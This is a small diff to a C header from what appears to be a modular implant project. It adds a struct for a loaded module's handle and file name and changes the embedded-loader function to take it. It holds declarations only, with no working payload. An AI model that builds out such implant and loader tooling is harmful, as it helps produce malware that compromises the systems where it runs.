@@ -43,6 +43,11 @@ typedef VOID(*IMPLANT_CALLBACK)(PIMPLANT_CONFIG pImplantConfig,
 	IMPLANT_FUNC fnFunc,
 	enum MODULAR_IMPLANT_RESOURCE_IDS iFuncType);
 
+typedef struct _LOADED_MODULE
+{
+	HMODULE	hModule;
+	PWSTR	pwszModuleFileName;
+} LOADED_MODULE, *PLOADED_MODULE;
 
 BOOL
 GetRandomPrefixW(
@@ -56,7 +61,7 @@ GetRandomTempFileNameW(
 
 BOOL
 LoadEmbeddedLoader(
-	VOID);
+	PLOADED_MODULE pLoadedModule);
 
 BOOL
 WriteDataToFile(
